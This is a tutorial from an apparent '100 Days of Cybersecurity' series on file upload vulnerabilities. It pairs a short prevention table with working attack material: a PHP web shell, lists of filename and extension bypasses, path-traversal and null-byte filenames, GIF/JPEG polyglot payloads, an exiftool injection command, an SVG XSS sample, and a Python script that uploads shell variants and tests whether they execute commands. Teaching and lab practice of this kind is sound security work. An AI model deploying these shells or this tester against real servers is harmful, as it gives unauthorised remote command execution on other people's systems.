# Day 033 - File Upload Vulnerabilities & Bypasses

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

File upload features are everywhere.

Profile pictures. Document uploads. Import functions. Avatar changes.

Every single one is a potential remote code execution vulnerability if the server doesn't properly validate what it receives.

The goal: upload a file the server will execute - a web shell - giving you command execution on the server.

---

## 🎯 What We're After - The Web Shell

A web shell is a script uploaded to a web server that executes system commands.

```php
<?php system($_GET['cmd']); ?>
```

Upload this as `shell.php`. Visit `https://target.com/uploads/shell.php?cmd=whoami`.

Server executes `whoami`. Returns the result. You have RCE.

Simple, powerful, devastating.

---

## 🔍 Validation Layers & How to Bypass Each

### Layer 1 - Client-Side Validation (JavaScript)

```javascript
// JavaScript checks file extension before upload
if (!file.name.endsWith('.jpg')) { alert('Only JPG allowed!'); }
```

**Bypass:** Disable JavaScript. Or intercept with Burp and change the filename after the JS check passes.

---

### Layer 2 - File Extension Blacklist

Server rejects known dangerous extensions: `.php`, `.jsp`, `.asp`

**Bypasses:**
```
shell.php3         → older PHP versions execute
shell.php4
shell.php5
shell.phtml        → PHP HTML - often missed
shell.pHp          → case variation on Windows/misconfigured servers
shell.php.jpg      → double extension - some servers use last, some use first
shell.php%00.jpg   → null byte truncation (older PHP)
shell.php;.jpg     → semicolon bypass
shell.asp;.jpg
shell.ashx         → ASP.NET alternative
shell.jsp          → Java server pages
shell.jspx
```

---

### Layer 3 - Extension Whitelist

Only allows `.jpg`, `.png`, `.gif`, `.pdf`

**Bypasses:**
```
# Change Content-Type but keep malicious extension
filename: shell.php
Content-Type: image/jpeg    ← lie about the type

# Polyglot files - valid image AND valid PHP
# A file that is simultaneously a valid GIF and valid PHP
GIF89a;<?php system($_GET['cmd']); ?>
Save as: shell.php
# GIF header passes image validation, PHP executes on the server

# SVG - XML-based, allows embedded scripts
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS via SVG upload')</script>
</svg>
# Upload as .svg → stored XSS
```

---

### Layer 4 - MIME Type / Content-Type Check

Server reads the Content-Type header.

**Bypass:** Intercept request in Burp. Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`. Keep the PHP content.

---

### Layer 5 - Magic Bytes Check

Server reads the first few bytes of the file (magic bytes) to determine real type.

```
JPEG: FF D8 FF
PNG:  89 50 4E 47
GIF:  47 49 46 38 39 61  (GIF89a)
PDF:  25 50 44 46
```

**Bypass - Prepend magic bytes:**
```php
# Add JPEG magic bytes before PHP payload
\xFF\xD8\xFF<?php system($_GET['cmd']); ?>

# Or use exiftool to inject PHP into a real image's metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg
```

---

### Layer 6 - Upload Directory Not Web-Accessible

Files uploaded to `/var/uploads/` - not served by the web server.

**Bypasses:**
```
# Path traversal in filename
filename: ../../var/www/html/shell.php
# Uploads to web root instead

# Find other upload paths
filename: ../uploads/shell.php

# Race condition
# Upload shell.php → server validates → server renames to shell.jpg
# Tiny window between upload and rename where shell.php is accessible
# Automate requests to hit that window
```

---

## 💻 The Code - Upload Vulnerability Tester

```python
"""
Day 033 - File Upload Vulnerability Tester
100 Days of Cybersecurity by Sudeep Ravichandran

Tests file upload endpoints for common bypass techniques.
Use only on systems you own or have permission to test.

Usage: python3 upload_tester.py <upload-url> <shell-url>
Requires: pip install requests
"""

import requests
import sys
import urllib3
urllib3.disable_warnings()


# PHP web shells - from simple to evasive
SHELLS = {
    "basic_php": {
        "content": b"<?php system($_GET['cmd']); ?>",
        "filename": "shell.php",
        "content_type": "application/x-php"
    },
    "gif_polyglot": {
        "content": b"GIF89a<?php system($_GET['cmd']); ?>",
        "filename": "shell.php",
        "content_type": "image/gif"
    },
    "jpeg_magic": {
        "content": b"\xff\xd8\xff<?php system($_GET['cmd']); ?>",
        "filename": "shell.php",
        "content_type": "image/jpeg"
    },
    "double_ext": {
        "content": b"<?php system($_GET['cmd']); ?>",
        "filename": "shell.php.jpg",
        "content_type": "image/jpeg"
    },
    "phtml": {
        "content": b"<?php system($_GET['cmd']); ?>",
        "filename": "shell.phtml",
        "content_type": "image/jpeg"
    },
    "null_byte": {
        "content": b"<?php system($_GET['cmd']); ?>",
        "filename": "shell.php\x00.jpg",
        "content_type": "image/jpeg"
    },
    "uppercase": {
        "content": b"<?php system($_GET['cmd']); ?>",
        "filename": "shell.PHP",
        "content_type": "image/jpeg"
    },
}


def try_upload(upload_url, shell_name, shell_data):
    """Attempt to upload a shell variant."""
    try:
        files = {
            "file": (
                shell_data["filename"],
                shell_data["content"],
                shell_data["content_type"]
            )
        }
        resp = requests.post(
            upload_url,
            files=files,
            timeout=10,
            verify=False,
            allow_redirects=True
        )
        return resp.status_code, resp.text[:200]
    except Exception as e:
        return None, str(e)


def test_shell_execution(shell_url, cmd="id"):
    """Test if uploaded shell executes commands."""
    try:
        resp = requests.get(
            f"{shell_url}?cmd={cmd}",
            timeout=10,
            verify=False
        )
        if resp.status_code == 200 and len(resp.text) > 0:
            return True, resp.text.strip()[:100]
        return False, f"Status: {resp.status_code}"
    except Exception as e:
        return False, str(e)


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 upload_tester.py <upload-url> [shell-url]")
        print("Example: python3 upload_tester.py http://target/upload")
        sys.exit(1)

    upload_url = sys.argv[1]
    shell_url  = sys.argv[2] if len(sys.argv) > 2 else None

    print("=" * 55)
    print("  File Upload Tester - Day 033")
    print("  100 Days of Cybersecurity")
    print("=" * 55)
    print(f"  Target: {upload_url}\n")

    print("[*] Testing upload bypass techniques...\n")
    for name, shell_data in SHELLS.items():
        status, response = try_upload(upload_url, name, shell_data)
        if status:
            indicator = "✓" if status in [200, 201, 302] else "✗"
            print(f"  {indicator} [{status}] {name:20} → {shell_data['filename']}")
            if "success" in response.lower() or "uploaded" in response.lower():
                print(f"       ↳ Upload appears successful!")
        else:
            print(f"  ? [ERR] {name:20} → {response}")

    if shell_url:
        print(f"\n[*] Testing shell execution at: {shell_url}")
        executed, output = test_shell_execution(shell_url)
        if executed:
            print(f"  🎯 SHELL EXECUTING: {output}")
        else:
            print(f"  ✗ Shell not executing: {output}")

    print("\n" + "=" * 55)
    print("  Manual follow-up:")
    print("  1. Check response for upload path/URL")
    print("  2. Try accessing shell at known upload directories")
    print("  3. Test ?cmd=whoami then ?cmd=id then ?cmd=ls")
    print("=" * 55)


if __name__ == "__main__":
    main()
```

**To run against DVWA (on Metasploitable2):**
```bash
pip install requests
python3 upload_tester.py http://192.168.56.101/dvwa/vulnerabilities/upload/
```

---

## 🛡️ Prevention

| Defence | How |
|---------|-----|
| Whitelist extensions | Only allow specific safe extensions |
| Rename on upload | Random UUID filename - attacker can't predict path |
| Store outside webroot | `/var/uploads/` not served by web server |
| Validate magic bytes | Server-side, not client-side |
| Separate domain | Serve uploads from `uploads.company.com` - no PHP execution |
| Content-Security-Policy | Limits XSS from SVG uploads |
| Antivirus scan | Scan uploads for malware before storing |

**The most effective single defence:** store uploads outside the webroot and serve through a controller that only reads files - never executes them.

---

## 🔑 Key Takeaways

- File upload = potential RCE if the server executes uploaded files
- Every validation layer has bypasses - defence in depth is required
- GIF polyglots pass image validation while containing executable PHP
- Magic bytes can be prepended or injected via exiftool
- Storing uploads outside the webroot breaks the entire attack chain
- DVWA has a file upload lab - practice all bypasses there

---

## 📚 Resources
- [PortSwigger File Upload Labs (free)](https://portswigger.net/web-security/file-upload)
- [DVWA - File Upload module](http://www.dvwa.co.uk/)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

## [⬅️ Day 032](../day032/) | [➡️ Day 034](../day034/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*